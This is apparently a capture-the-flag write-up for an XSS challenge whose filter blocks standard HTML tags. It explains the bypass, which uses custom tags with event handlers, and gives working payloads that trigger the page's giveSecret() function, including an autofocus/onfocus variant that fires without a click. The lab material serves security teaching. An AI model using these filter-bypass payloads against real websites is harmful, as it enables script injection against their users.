## Intoduction

This is a harder XSS challenge it blocks predefined HTML tags.


## Investigation

If you investigate the HTML source code you'll eventually find the following script tag

```html

    <script>
        window.__nonce = "{{ nonce }}";
        
          const giveSecret = async () => {
            await fetch("/activate-flag", {
                method: "POST",
                headers : {
                    "X-Nonce" : window.__nonce,
                    "Content-Type": "application/json"
                },
                body : JSON.stringify({ message: "{{ message }}" }),
                credentials: "include" 
            })
            
            location.href = "/flag"
            
        }
    </script>

```

So the `giveSecret()` function activates the flag page to give us the flag so you need to trigger it otherwise the flag page won't show you the real flag.

Triggering the function using the console of the browser won't work because the CTF-challenge requires you to exploit XSS vulnerability and a valid payload.

And the predefined HTML tags won't be inserted in this room.


## Vulnerability

Basically instead of inserting the casual predefined HTML tags like

```html
<body></body>
<html></html>
<p></p>
<script></script>
```

We are going to use custom HTML tags so the vulnerability here is that the "WAF" of this app only blocks known predefined HTML elements but it has no problem with custom-html tags like

```html
<xss></xss>
<custom-tag></custom-tag>
```

## Exploit and Payloads

So to exploit this vulnerability we are going to insert a custom-html tag with an event that triggers the function `giveSecret()` to get our flag.

Using any custom html tag + event trigger is correct.

So examples for payload are:

```html

<xss onclick="giveSecret()">Click Me! </xss> <!-- You need to click it then -->
<random tabindex="0" autofocus onfocus="giveSecret()"></random> <!-- This payload will make the tag focusable and will autofocus on it and when a focus happens the giveSecret function will be triggered -->
```

And much more the CTF challenge is free and accepts many payloads as long as you understand the functionality of custom-html tags you are free to craft what payload you want.


## Summary

1. Create custom HTML Tag + an event that triggers the giveSecret function
2. Trigger that event